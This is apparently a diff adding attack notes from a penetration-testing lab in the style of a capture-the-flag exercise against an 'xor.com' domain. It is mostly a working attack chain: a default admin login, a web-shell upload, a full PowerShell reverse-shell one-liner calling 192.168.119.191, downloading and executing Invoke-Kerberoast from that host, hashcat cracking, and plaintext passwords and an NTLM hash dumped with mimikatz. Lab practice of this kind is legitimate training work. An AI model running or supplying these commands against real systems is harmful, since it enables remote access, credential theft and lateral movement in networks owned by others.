@@ -1,0 +1,35 @@
+# 1 login acc: admin@xor.com  pwd: admin
+
+# 2 upload web-shell
+
+# 3 execute shell
+http://10.11.1.123/books/myFiles/images/web-shell.php
+
+# 4 reversh shell for assessing 10.11.1.123
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.191',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# 5 Get SPN on the machine
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.191.221:9000/list_SPN.ps1", "C:\Windows\Temp\list_SPN.ps1")
+
+# 6 Request from service account
+Add-Type -AssemblyName System.IdentityModel 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/xor-app23.xor.com:1433'
+
+# 7 obtain hash
+iex(new-object net.webclient).downloadString('http://192.168.119.191:9000/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
+
+# 8 crack hash
+hashcat -m 13100 --force -a 0 SQL_Service_hashcat.txt /usr/share/wordlists/rockyou.txt [--show]
+
+# 9 Get login credential for 10.11.1.121
+SQL service acc: XOR.COM\sqlServer	pwd: shantewhite	ntlm: 643f5625a4e347d9208dba1c3f299af4
+xfreerdp /u:sqlServer /p:shantewhite /v:$IP
+
+# 10 Get daisy credential from 10.11.1.121
+using mimikatz 2.1.1
+daisy acc: XOR.COM\daisy pwd: XorPasswordIsDead17
+
+# 11 Get david credential from 10.11.1.122
+david acc: XOR.COM\daivd pwd: dsfdf34534tdfGDFG5rdgr
+
+# 12 Get the flag on 10.11.1.120 with david account
